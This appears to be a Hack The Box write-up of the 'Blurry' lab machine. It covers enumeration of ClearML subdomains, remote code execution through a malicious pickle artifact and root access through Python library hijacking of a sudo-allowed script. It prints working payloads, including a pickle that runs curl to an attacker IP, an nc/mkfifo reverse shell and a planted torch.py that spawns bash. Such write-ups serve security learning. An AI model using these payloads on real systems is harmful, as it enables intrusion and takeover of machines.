---
title: HTB-Blurry
draft: false
tags:
  - htb
  - linux
  - medium
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/blurry/Blurry.png)

## Information Gathering
### Rustscan

Rustscan find SSH and HTTP running on the target machine:

`rustscan --addresses 10.10.11.19 --range 1-65535`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/blurry/image.png)

### Nmap

Nmap discovers subdomain **app.blurry.htb**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/blurry/image-1.png)

We will add **blurry.htb** and  **app.blurry.htb** to  `/etc/hosts`.

## Enumeration
### HTTP - TCP 80

Since nmap discovered subdomain already, let's see if there are more:

`sudo gobuster vhost --append-domain -u http://blurry.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/blurry/image-3.png)

Gobuster discovers couple more subdomains. We will add all of them to `/etc/hosts`.

**app.blurry.htb** is a login page for **ClearML**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/blurry/image-2.png)

> ClearML is an open-source platform designed to streamline and manage the lifecycle of machine learning (ML) projects. It provides tools and services for experiment management, data management, model training, and deployment, facilitating collaboration and reproducibility within data science and ML teams. 

Without needing any credentials, we can access `/dashboard` after typing in random username:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/blurry/image-9.png)

**api.blurry.htb** shows some sort of hashes which seems to be a key:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/blurry/image-4.png)

**files.blurry.htb** has nothing special on it:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/blurry/image-5.png)

**chat.blurry.htb** shows a login portal for **Blurry Vision Workspace**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/blurry/image-6.png)

We have access to the dashboard after user registration:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/blurry/image-7.png)

Looking around, we see some of the potential users:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/blurry/image-8.png)

However, nothing else seems to be intriguing.

## Shell as jippity
### ClearML RCE

Let's try creating new project on **app.blurry.htb**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/blurry/image-10.png)

We are prompted with the page where it guides you how to set up ClearML locally:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/blurry/image-12.png)

We will follow insturction and set up ClearML:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/blurry/image-11.png)

Now that we have ClearML cofigured, we wil creata a Python script creating a malicious pickle object and uploading it as an artifact to a ClearML project:

```python
import pickle,os

class RunCommand:
    def __reduce__(self):
        return (os.system, ('curl http://10.10.14.36:8000/pwn',))


command = RunCommand()



from clearml import Task

task = Task.init(project_name='Black Swan', task_name='pickle_artifact_upload', tags=["review"], output_uri=True)

task.upload_artifact(name='pickle_artifact', artifact_object=command, retries=2, wait_on_upload=True, extension_name=".pkl")


with open('pickle_artifact.pkl','wb') as f:
    pickle.dump(command,f)
```

Let's run the script:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/blurry/image-13.png)

We can see that the curl command is successfully executed and we get incoming connection on our Python server:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/blurry/image-14.png)

We have no confirmed RCE. 

Let's modify the script to get a reverse shell:

```python
class RunCommand:
    def __reduce__(self):
        return (os.system, ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.36 1337 > /tmp/f',))
```

Rerun the script after modification and we get a shell as **jippity**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/blurry/image-15.png)

## Privesc: jippity to root
### Sudoers

We will frist check whether there are any commands that could be ran with sudo privilege:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/blurry/image-16.png)

`/usr/bin/evaluate_model` could be ran with sudo privilege.

Let's take a look at the the file:

```bash
#!/bin/bash
# Evaluate a given model against our proprietary dataset.
# Security checks against model file included.

if [ "$#" -ne 1 ]; then
    /usr/bin/echo "Usage: $0 <path_to_model.pth>"
    exit 1
fi

MODEL_FILE="$1"
TEMP_DIR="/models/temp"
PYTHON_SCRIPT="/models/evaluate_model.py"  

/usr/bin/mkdir -p "$TEMP_DIR"

file_type=$(/usr/bin/file --brief "$MODEL_FILE")

# Extract based on file type
if [[ "$file_type" == *"POSIX tar archive"* ]]; then
    # POSIX tar archive (older PyTorch format)
    /usr/bin/tar -xf "$MODEL_FILE" -C "$TEMP_DIR"
elif [[ "$file_type" == *"Zip archive data"* ]]; then
    # Zip archive (newer PyTorch format)
    /usr/bin/unzip -q "$MODEL_FILE" -d "$TEMP_DIR"
else
    /usr/bin/echo "[!] Unknown or unsupported file format for $MODEL_FILE"
    exit 2
fi

/usr/bin/find "$TEMP_DIR" -type f \( -name "*.pkl" -o -name "pickle" \) -print0 | while IFS= read -r -d $'\0' extracted_pkl; do
    fickling_output=$(/usr/local/bin/fickling -s --json-output /dev/fd/1 "$extracted_pkl")

    if /usr/bin/echo "$fickling_output" | /usr/bin/jq -e 'select(.severity == "OVERTLY_MALICIOUS")' >/dev/null; then
        /usr/bin/echo "[!] Model $MODEL_FILE contains OVERTLY_MALICIOUS components and will be deleted."
        /bin/rm "$MODEL_FILE"
        break
    fi
done

/usr/bin/find "$TEMP_DIR" -type f -exec /bin/rm {} +
/bin/rm -rf "$TEMP_DIR"

if [ -f "$MODEL_FILE" ]; then
    /usr/bin/echo "[+] Model $MODEL_FILE is considered safe. Processing..."
    /usr/bin/python3 "$PYTHON_SCRIPT" "$MODEL_FILE"
    
fi
```

`/usr/bin/evaluate_model` performs the following main functions:

- Checks that exactly one argument (model file path) is provided.
- Extracts the model file based on its type (tar or zip).
- Scans extracted files for malicious components using fickling.
- Deletes the model file if any malicious components are detected.
- Processes the model file using a Python script if it is deemed safe.

### Python Library Hijacking

Let's exploit `/usr/bin/evaluate_model` execution. 

We will first create a file named torch.py containing Python code that, when executed, will spawn a bash shell:

`echo 'import os; os.system("bash")' > /models/torch.py`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/blurry/image-17.png)

When we run `/usr/bin/evaluate_model` towards `/models/demo_model.pth`, we will get a shell as the root:

`sudo /usr/bin/evaluate_model /models/demo_model.pth`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/blurry/image-18.png)

Let's see what just happened.




`sudo /usr/bin/evaluate_model /models/demo_model.pth`

When we run this command, the following sequence of events occurs within the evaluate_model script:

**File Type Check and Extraction**:

The script determines the file type of `/models/demo_model.pth` and extracts it to the temporary directory (`/models/temp`). Let's assume `/models/demo_model.pth` is either a tar or zip archive containing some files, possibly including a pickle file.

**Malicious Check Using Fickling**:

The script looks for pickle files in the extracted contents and checks them for malicious components using fickling. If no overtly malicious components are found, the script proceeds to the next step.

**Cleanup**:

The script cleans up the temporary directory by deleting the extracted files.

**Python Script Execution**:

Finally, if the model file is considered safe, the script executes a Python script to process the model file:

`/usr/bin/python3 "$PYTHON_SCRIPT" "$MODEL_FILE"`

**Python Module Loading**:

When the Python interpreter runs the evaluation script, it might import various modules. Given that we have placed a malicious **torch.py** in /models, if the `PYTHONPATH` or the current working directory includes `/models`, Python mistakenly import our malicious `torch.py` instead of the legitimate torch library.
